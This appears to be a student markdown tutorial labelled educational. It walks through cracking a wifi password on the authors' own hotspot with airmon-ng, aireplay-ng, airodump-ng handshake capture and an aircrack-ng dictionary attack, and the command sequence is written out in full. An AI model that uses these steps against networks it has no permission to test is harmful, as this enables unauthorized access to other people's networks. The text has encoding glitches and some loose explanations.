## Wifi Attack
ðŸ“¢JUST FOR EDUCATIONNAL PURPOSEðŸ“¢
>**Prerequisites**<br/>
>We need to have *hostpot* (wifi name (**ssid**)) available in this case we just  put sample password (**1234567890**)


To start open your terminal and type the command bellow : 
```console
ifconfig
``` 

 or
 
 ```console
iwconfig
```
 
 > Those commands allow you to list all network interface available and to apply the attack we focus on *wlan0* interface (wireless network)

Next<br/>

This command stops network managers then kill interfering processes left <br/>
**Note:** It is very important to kill the network managers before putting a card in monitor mode!

```console
sudo airmon-ng check kill
```

Now we start *monitoring mode* on our card :
```console
$ sudo airmon-ng start wlan0
```

Next<br/>

```console
sudo aireplay-ng -9 wlan0mon
```

So we have to use the ``wlan0mon`` interface to see all the access points around us and what is being done in these different access points.We see "Â **injection is working** " and we have the access points that are displayed. We are interested in the access point "TECNO SPARK 6 Air" and you see that each access point operates in a specific channel. For us it is ``channel 13``.

Next <br/>
```console
sudo aireplay-ng -9 wlan0mon
sudo airodump-ng -c 13 --bssid 76:C7:DA:D8:1A:AD -w group8 wlan0mon
```
Here we will copy the ``bssid`` which is the ``Mac address`` of our access point and we will execute the airodum-ng command with the precise parameters as follows: in the terminal, it will generate traffic at the access point location Â 

While the packets are going through, when someone is going to connect. And we'll see that it will have change, we'll see a **handshake** that confirms that there is a client that wanted to connect to our access point.

Finally,<br/>
```console
sudo aircrack-ng -w /usr/share/metasploit-framework/data/wordlists/password.lst group8-01.cap
```
And now we will use the ``aircrack`` command that allows us to crack the password that relies on a file that contains a set of predefined passwords to retrieve the password entered. After validating, we see the password appear in the dictionnary ``password`` which is not very **huge**.
